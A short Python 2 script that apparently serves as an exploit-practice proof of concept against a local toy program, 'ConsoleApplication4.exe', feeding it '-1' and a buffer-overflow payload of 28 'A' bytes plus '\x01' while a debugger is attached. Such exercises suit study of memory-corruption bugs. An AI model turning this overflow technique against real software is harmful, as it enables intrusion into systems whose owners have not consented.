from subprocess import *
import struct

p = Popen([r'ConsoleApplication4.exe', 'f'], stdin=PIPE, stdout=PIPE, stderr=STDOUT)

print "Attach debbuger and press ENTER"
raw_input()

first = "-1\n"
p.stdin.write(first)

payload = payload = 28 * "A" + "\x01" + "\n"
p.stdin.write(payload)

first = "-1\n"
p.stdin.write(first)

payload = payload = 28 * "A" + "\x01" + "\n"
p.stdin.write(payload)

finalResult = p.communicate()[0]

print (finalResult)